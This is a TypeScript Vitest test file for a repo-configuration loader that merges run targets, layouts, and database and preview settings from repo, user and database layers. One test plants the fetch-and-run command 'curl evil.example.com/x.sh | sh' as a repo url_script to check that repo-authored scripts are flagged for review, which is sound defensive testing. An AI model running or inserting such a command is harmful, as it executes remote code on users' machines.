import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterEach, beforeEach, describe, expect, it } from 'vitest'
import { loadRepoConfig, projectRunTargets } from './runConfig'

describe('loadRepoConfig (docs/workflows.md §2)', () => {
  let dir: string
  let repoDir: string
  let userDir: string

  const writeConfig = (base: string, text: string) => {
    mkdirSync(join(base, '.acorn'), { recursive: true })
    writeFileSync(join(base, '.acorn', 'config.toml'), text)
  }

  beforeEach(() => {
    dir = mkdtempSync(join(tmpdir(), 'acorn-cfg-'))
    repoDir = join(dir, 'repo')
    userDir = join(dir, 'home')
    mkdirSync(repoDir)
    mkdirSync(userDir)
  })

  afterEach(() => rmSync(dir, { recursive: true, force: true }))

  it('absent files → DB fallback: a scalar runCommand no longer creates a target', () => {
    const cfg = loadRepoConfig(repoDir, userDir, {})
    expect(cfg.errors).toEqual([])
    expect(cfg.runTargets).toEqual([]) // no dev script / config → no run button
    expect(cfg.copy).toEqual([])
  })

  it('workspace devScript → a base `dev` target; repo config and the run_targets JSON override it', () => {
    // Alone, the workspace dev script surfaces as a plain `dev` target: no default flag, no URL.
    expect(loadRepoConfig(repoDir, userDir, { devScript: 'pnpm dev' }).runTargets).toEqual([{ id: 'dev', command: 'pnpm dev' }])
    // The per-repo run_targets JSON column is more specific, so it overrides the workspace base.
    const json = JSON.stringify([{ id: 'dev', command: 'make run' }])
    expect(loadRepoConfig(repoDir, userDir, { devScript: 'pnpm dev', runTargetsJson: json }).runTargets).toEqual([{ id: 'dev', command: 'make run' }])
    // A committed repo config.toml also wins over the workspace base.
    writeConfig(repoDir, `[scripts.run.dev]\ncommand = "./scripts/dev.sh"`)
    expect(loadRepoConfig(repoDir, userDir, { devScript: 'pnpm dev' }).runTargets.find((t) => t.id === 'dev')?.command).toBe('./scripts/dev.sh')
  })

  it('a committed repo config wins over user config over DB', () => {
    writeConfig(userDir, `
[scripts]
setup = "user-setup"
[scripts.run.dev]
command = "user-dev"
[scripts.run.lint]
command = "pnpm lint"
`)
    writeConfig(repoDir, `
[scripts]
setup = "repo-setup"
[scripts.run.dev]
command = "./scripts/dev.sh"
url_command = "./scripts/dev-url.sh"
default = true
[scripts.run.stack]
command = "docker compose -p acorn-$ACORN_TASK_SLUG up"
stop = "docker compose -p acorn-$ACORN_TASK_SLUG down"
url = "http://localhost:8080"
copy = [".env.local"]
`)
    const cfg = loadRepoConfig(repoDir, userDir, {})
    // `[scripts] setup` is reported, not applied, once per layer that declares it (parseLayer).
    expect(cfg.errors.map((e) => `${e.source}: ${e.message}`)).toEqual([
      "repo: [scripts] setup is not read. Set the setup script in the project's settings.",
      "user: [scripts] setup is not read. Set the setup script in the project's settings.",
    ])
    const ids = cfg.runTargets.map((t) => t.id).sort()
    expect(ids).toEqual(['dev', 'lint', 'stack'])
    const dev = cfg.runTargets.find((t) => t.id === 'dev')
    expect(dev).toEqual({ id: 'dev', command: './scripts/dev.sh', urlCommand: './scripts/dev-url.sh', default: true, stop: undefined, url: undefined, icon: undefined })
    const stack = cfg.runTargets.find((t) => t.id === 'stack')
    expect(stack?.stop).toContain('down')
    expect(stack?.url).toBe('http://localhost:8080')
  })

  it('parses copy and layout recipes', () => {
    writeConfig(repoDir, `
copy = [".env.local", ".env.development"]
[layout.review]
panes = ["pr", "changes"]
ratio = 0.5
terminal = "dev"
browser = "run:dev"
`)
    const cfg = loadRepoConfig(repoDir, null, {})
    expect(cfg.errors).toEqual([])
    expect(cfg.copy).toEqual(['.env.local', '.env.development'])
    // `ratio` in the file is tolerated but not parsed: panes split equally (docs/workflows.md).
    expect(cfg.layouts).toEqual([{ id: 'review', panes: ['pr', 'changes'], terminal: 'dev', browser: 'run:dev' }])
  })

  it('db/preview: project config fallback resolves; committed [database]/[preview] toml wins (project-level-settings)', () => {
    // DB fallback only, with no toml, so the project values pass through.
    const fallback = loadRepoConfig(repoDir, userDir, { dbUrlScript: 'db-fallback', previewMode: 'port', previewValue: '3000' })
    expect(fallback.errors).toEqual([])
    expect(fallback.dbUrlScript).toBe('db-fallback')
    expect(fallback.preview).toEqual({ mode: 'port', value: '3000' })
    // Committed .acorn/config.toml wins over the project fallback.
    writeConfig(repoDir, `
[database]
url_script = "bin/print-db-url"
[preview]
mode = "url"
value = "https://app.test"
`)
    const cfg = loadRepoConfig(repoDir, userDir, { dbUrlScript: 'db-fallback', previewMode: 'port', previewValue: '3000' })
    expect(cfg.errors).toEqual([])
    expect(cfg.dbUrlScript).toBe('bin/print-db-url')
    expect(cfg.preview).toEqual({ mode: 'url', value: 'https://app.test' })
    // browserRules is DB-only, with no toml layer, so it passes through untouched.
    const rule = { id: 'r1', enabled: true, urlPattern: 'localhost/login', trigger: 'load' as const, action: { type: 'fill' as const, selector: '#u', value: 'dev' } }
    expect(loadRepoConfig(repoDir, userDir, { browserRules: [rule] }).browserRules).toEqual([rule])
  })

  it('dbUrlFromRepo reports url_script provenance — it decides whether the trust gate applies', () => {
    // dbUrlScript runs as a shell script (plugins/database/main/database.ts), so a checkout authoring it
    // must be gated on review while a user authoring it must not be. That hinges entirely on this flag,
    // so it's asserted for every layer that can win.
    expect(loadRepoConfig(repoDir, userDir, { dbUrlScript: 'db-fallback' }).dbUrlFromRepo).toBe(false)
    writeConfig(userDir, `[database]\nurl_script = "personal"`)
    const user = loadRepoConfig(repoDir, userDir, { dbUrlScript: 'db-fallback' })
    expect(user.dbUrlScript).toBe('personal')
    expect(user.dbUrlFromRepo).toBe(false) // ~/.acorn is the user's own config, not the checkout's
    writeConfig(repoDir, `[database]\nurl_script = "curl evil.example.com/x.sh | sh"`)
    const repo = loadRepoConfig(repoDir, userDir, { dbUrlScript: 'db-fallback' })
    expect(repo.dbUrlScript).toBe('curl evil.example.com/x.sh | sh')
    expect(repo.dbUrlFromRepo).toBe(true)
  })

  it('malformed TOML → structured error, not a throw; falls back to lower layers', () => {
    writeConfig(repoDir, `[scripts.run.dev\ncommand = broken`)
    writeConfig(userDir, `[scripts.run.dev]\ncommand = "user-dev"`)
    const cfg = loadRepoConfig(repoDir, userDir, {})
    expect(cfg.errors).toHaveLength(1)
    expect(cfg.errors[0].source).toBe('repo')
    expect(cfg.runTargets).toEqual([{ id: 'dev', command: 'user-dev', stop: undefined, url: undefined, urlCommand: undefined, icon: undefined, default: undefined }])
  })

  // The drift this replaced: `[scripts] setup` and `[scripts] archive` parsed, merged, and were read by
  // nothing, so a repo could declare a setup script and watch it never run. They are reported now.
  it('tells a repo that [scripts] setup and archive are not read', () => {
    writeConfig(repoDir, `[scripts]\nsetup = "repo-setup"\n[scripts.archive]\ncommand = "docker compose down"`)
    const messages = loadRepoConfig(repoDir, null, {}).errors.map((e) => e.message)
    expect(messages).toHaveLength(2)
    expect(messages[0]).toContain('[scripts] setup is not read')
    expect(messages[1]).toContain('[scripts] archive is not read')
  })

  it('validates run targets: missing command and url+url_command conflicts are errors', () => {
    writeConfig(repoDir, `
[scripts.run.bad]
icon = "play"
[scripts.run.conflicted]
command = "x"
url = "http://a"
url_command = "echo b"
[scripts.run.good]
command = "pnpm db:seed"
`)
    const cfg = loadRepoConfig(repoDir, null, {})
    expect(cfg.errors.map((e) => e.message).join(' ')).toMatch(/bad.*command/)
    expect(cfg.errors).toHaveLength(2)
    expect(cfg.runTargets).toEqual([{ id: 'good', command: 'pnpm db:seed', stop: undefined, url: undefined, urlCommand: undefined, icon: undefined, default: undefined }])
  })
})

describe('projectRunTargets (run_targets JSON column)', () => {
  it('reads the typed runTargets JSON column and survives malformed JSON', () => {
    const json = JSON.stringify([{ id: 'stack', command: 'docker compose up', stop: 'docker compose down' }])
    expect(projectRunTargets({ runTargetsJson: json })[0].id).toBe('stack')
    expect(projectRunTargets({ runTargetsJson: '{not json' })).toEqual([]) // malformed → no targets
    expect(projectRunTargets({})).toEqual([])
  })
})
